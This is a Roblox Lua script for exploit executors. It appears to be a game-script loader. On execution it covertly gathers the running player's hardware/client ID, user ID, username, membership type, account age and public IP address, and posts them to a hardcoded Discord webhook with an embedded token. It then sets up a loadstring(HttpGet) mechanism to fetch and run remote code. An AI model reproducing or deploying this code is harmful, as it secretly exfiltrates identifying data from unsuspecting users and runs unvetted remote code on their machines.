
    local HttpService = game:GetService("HttpService")
    local Webhook_URL = "https://discord.com/api/webhooks/1039590141708218438/E5nSc6bhEZkuD3jMp-wpxfqBwXK72pcrjrKprXQmXOYuNZIXINsD0P1TA1K9olHxNsgy"
    local request = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
  
  local responce = request(
  {
    Url = Webhook_URL,
    Method = 'POST',
    Headers = {
      ['Content-Type'] = 'application/json'
  },
  Body = HttpService:JSONEncode({
  ["content"] = "",
  ["embeds"] = {{
      ["type"] = "rich",
      ["fields"] = {
        {
            ["name"] = "Hardware ID:",
            ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
            },
            {
            ["name"] = "User ID:",
            ["value"] = game.Players.LocalPlayer.UserId,
             },
             {
            ["name"] = "Username/Display:",
            ["value"] = game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName
             },
                 {
            ["name"] = "MembershipType:",
            ["value"] = string.sub(tostring(Game.Players.LocalPlayer.MembershipType), 21),
                 },
                 {
                  ["name"] = " Account Age:",
                  ["value"] = game.Players.LocalPlayer.AccountAge.." Days",
                       },
            {
            ["name"] = " IPv4",
            ["value"] = game:HttpGet("https://v4.ident.me/"),
                 },
        }
     }}
   })
  }
  )
  
  local games = {
    [{}] = " ", -- 
  }
  
  for ids, url in next, games do
  if table.find(ids, game.PlaceId) then
      loadstring(game:HttpGet(url))(); break
  end
end
